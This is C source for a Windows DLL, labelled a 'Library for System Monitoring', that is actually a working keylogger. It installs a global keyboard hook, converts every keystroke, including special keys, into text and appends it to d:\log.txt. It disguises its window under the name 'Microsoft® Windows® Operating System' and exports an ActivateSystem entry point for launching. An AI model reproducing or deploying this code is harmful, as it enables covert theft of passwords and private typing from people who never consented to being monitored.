
// Library for System Monitoring
// Written by Arjun Menon

#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

/*********************.
| Function Prototypes |
`*********************/

int WINAPI StartSystem(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, PSTR szCmdLine, int nCmdShow);
LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
		WPARAM wParam,LPARAM lParam);
int WINAPI DllMain(HANDLE hModule,
DWORD ul_reason_for_call, LPVOID lpReserved);
__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
HHOOK StartSensing();
LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam);
void DescribeKey(WPARAM wParam, char *keyw);
void WriteToFile(char *str);

/******************.
| Global Variables |
`******************/

static char szAppName[] = "Microsoft® Windows® Operating System";
HANDLE hDLL = NULL;

/*********.
| Program |
`*********/

int WINAPI StartSystem(HINSTANCE hInstance, 
					   HINSTANCE hPrevInstance, 
					   PSTR szCmdLine, int nCmdShow)
{
     HWND        hwnd ;
     MSG         msg ;
     WNDCLASS    wndclass ;
	 LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
		 WPARAM wParam, LPARAM lParam);

     wndclass.style         = CS_HREDRAW | CS_VREDRAW ;
     wndclass.lpfnWndProc   = WndProc ;
     wndclass.cbClsExtra    = 0 ;
     wndclass.cbWndExtra    = 0 ;
     wndclass.hInstance     = hInstance ;
     wndclass.hIcon         = LoadIcon (NULL, IDI_WINLOGO) ;
     wndclass.hCursor       = LoadCursor (NULL, IDC_ARROW) ;
     wndclass.hbrBackground = (HBRUSH) GetStockObject (WHITE_BRUSH) ;
     wndclass.lpszMenuName  = NULL ;
     wndclass.lpszClassName = szAppName ;
     
     if (!RegisterClass (&wndclass))
          return 0 ;
     
     hwnd = CreateWindow (szAppName, szAppName,
                          WS_OVERLAPPEDWINDOW,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          CW_USEDEFAULT, CW_USEDEFAULT,
                          NULL, NULL, hInstance, NULL) ;

	 ShowWindow(hwnd, nCmdShow);

     while (GetMessage (&msg, NULL, 0, 0))
     {
          TranslateMessage (&msg) ;
          DispatchMessage (&msg) ;
     }

     return msg.wParam ;
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message,
						  WPARAM wParam,LPARAM lParam)
{
	switch (message)
	{
	case WM_CREATE:
		DeleteFile("d:\\log.txt");
		StartSensing();
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage (0) ;
		return 0 ;
	}
	return DefWindowProc (hwnd, message, wParam, lParam) ;
}

int WINAPI DllMain(HANDLE hModule,
				   DWORD ul_reason_for_call,
				   LPVOID lpReserved)
{
	hDLL = hModule;

	return TRUE;
}

__declspec(dllexport) void ActivateSystem
(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	StartSystem((HINSTANCE)hDLL, NULL, "", SW_NORMAL);
}

HHOOK StartSensing()
{
	return SetWindowsHookEx(WH_KEYBOARD,
	(HOOKPROC)KeyboardHookProc,(HINSTANCE)hDLL,NULL);
}

void WriteToFile(char *str)
{
	if(!str) return;
	HANDLE hFile; 
	DWORD  nFile; 
	
	hFile = CreateFile("d:\\log.txt", GENERIC_WRITE,
	0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return;

	SetFilePointer(hFile, 0, NULL, FILE_END);
	WriteFile(hFile, str, strlen(str), &nFile, NULL);
	CloseHandle(hFile);
}

LRESULT CALLBACK KeyboardHookProc
(int code, WPARAM wParam, LPARAM lParam)
{
	/* The 32nd bit of lParam tells us if 
	   the key is being pressed or released */
	if(!(lParam >> 31))
	{
		//MessageBeep(-1);
		char *keyw = (char *)calloc(30, sizeof(char));
		DescribeKey(wParam, keyw);

		/* The first 16 bits of lParam tells
		   us how long the key was pressed */
		UINT repeat = (lParam << 16) >> 16;
		if(!repeat) repeat = 1;
		char *key = (char *) calloc
		((repeat * strlen(keyw))+1, sizeof(char));
		if(key == NULL)
			goto exit_point;
		while(repeat--)
			strcat(key, keyw);

		if(key)
			WriteToFile(key);
	exit_point:
		free(keyw);
		free(key);
	}

	return CallNextHookEx(NULL, code, wParam, lParam);
}

void DescribeKey(WPARAM wParam, char *keyw)
{
	char vkc = 0; /* virtual key code */

	vkc = /* maintain alphabet case */
		((GetKeyState(VK_SHIFT) < 0)&&(
		!(GetKeyState(VK_CAPITAL) < 0)))
		? toupper((char)(wParam))
		: tolower((char)(wParam));

	/* numeric pad keys 0 to 10 */
	if((wParam >= 0x60)&&
	   (wParam <= 0x69))
		wParam -= 0x30;

	/* keys from 0 to 9 , A to Z and space */
	if(((wParam >= 0x30) 
	  &&(wParam <= 0x5A)) 
	  ||(wParam == 0x20))
	{
		keyw[0] = vkc;
		keyw[1] = 0;
	}

	else switch(wParam)
	{
	case 0x03:
		strcpy(keyw,"[CTRL-BRK]");
		break;
	case 0x08:
		strcpy(keyw,"[BACK]");
		break;
	case 0x09:
		strcpy(keyw,"[TAB]");
		break;
	case 0x0C:
		strcpy(keyw,"[CLEAR]");
		break;
	case 0x0D:
		strcpy(keyw,"[ENTER]\r\n");
		break;
	case 0x10:
		strcpy(keyw,"[SHIFT]");
		break;
	case 0x11:
		strcpy(keyw,"[CTRL]");
		break;
	case 0x12:
		strcpy(keyw,"[ALT]");
		break;
	case 0x13:
		strcpy(keyw,"[PAUSE]");
		break;
	case 0x14:
		strcpy(keyw,"[CapsLock]");
		break;
	case 0x1B:
		strcpy(keyw,"[ESC]");
		break;
	case 0x21:
		strcpy(keyw,"[PageUp]");
		break;
	case 0x22:
		strcpy(keyw,"[PageDown]");
		break;
	case 0x23:
		strcpy(keyw,"[END]");
		break;
	case 0x24:
		strcpy(keyw,"[HOME]");
		break;
	case 0x25:
		strcpy(keyw,"[LEFT]");
		break;
	case 0x26:
		strcpy(keyw,"[UP]");
		break;
	case 0x27:
		strcpy(keyw,"[RIGHT]");
		break;
	case 0x28:
		strcpy(keyw,"[DOWN]");
		break;
	case 0x29:
		strcpy(keyw,"[SELECT]");
		break;
	case 0x2B:
		strcpy(keyw,"[EXECUTE]");
		break;
	case 0x2C:
		strcpy(keyw,"[PrintScreen]");
		break;
	case 0x2D:
		strcpy(keyw,"[INSERT]");
		break;
	case 0x2E:
		strcpy(keyw,"[DELETE]");
		break;
	case 0x2F:
		strcpy(keyw,"[HELP]");
		break;
	case 0x5B:
		strcpy(keyw,"[LeftWindowsKey]");
		break;
	case 0x5C:
		strcpy(keyw,"[RightWindowsKey]");
		break;
	case 0x5D:
		strcpy(keyw,"[ApplicationKey]");
		break;
	case 0x6A:
		strcpy(keyw,"[MULTIPLY]");
		break;
	case 0x6B:
		strcpy(keyw,"[ADD]");
		break;
	case 0x6C:
		strcpy(keyw,"[SEPERATOR]");
		break;
	case 0x6D:
		strcpy(keyw,"[SUBTRACT]");
		break;
	case 0x6E:
		strcpy(keyw,"[DECIMAL]");
		break;
	case 0x6F:
		strcpy(keyw,"[DIVIDE]");
		break;
	case 0x70:
		strcpy(keyw,"[F1]");
		break;
	case 0x71:
		strcpy(keyw,"[F2]");
		break;
	case 0x72:
		strcpy(keyw,"[F3]");
		break;
	case 0x73:
		strcpy(keyw,"[F4]");
		break;
	case 0x74:
		strcpy(keyw,"[F5]");
		break;
	case 0x75:
		strcpy(keyw,"[F6]");
		break;
	case 0x76:
		strcpy(keyw,"[F7]");
		break;
	case 0x77:
		strcpy(keyw,"[F8]");
		break;
	case 0x78:
		strcpy(keyw,"[F9]");
		break;
	case 0x79:
		strcpy(keyw,"[F10]");
		break;
	case 0x7A:
		strcpy(keyw,"[F11]");
		break;
	case 0x7B:
		strcpy(keyw,"[F12]");
		break;
	case 0x7C:
		strcpy(keyw,"[F13]");
		break;
	case 0x7D:
		strcpy(keyw,"[F14]");
		break;
	case 0x7E:
		strcpy(keyw,"[F15]");
		break;
	case 0x7F:
		strcpy(keyw,"[F16]");
		break;
	case 0x90:
		strcpy(keyw,"[NumLock]");
		break;
	case 0x91:
		strcpy(keyw,"[ScrollLock]");
		break;
	case 0xF6:
		strcpy(keyw,"[ATTN]");
		break;
	case 0xF7:
		strcpy(keyw,"[CrSel]");
		break;
	case 0xF8:
		strcpy(keyw,"[ExSel]");
		break;
	case 0xF9:
		strcpy(keyw,"[EraseEOF]");
		break;
	case 0xFA:
		strcpy(keyw,"[PLAY]");
		break;
	case 0xFB:
		strcpy(keyw,"[ZOOM]");
		break;
	default:
		sprintf(keyw,"[(%X)%c]",wParam,wParam);
		break;
	}
}
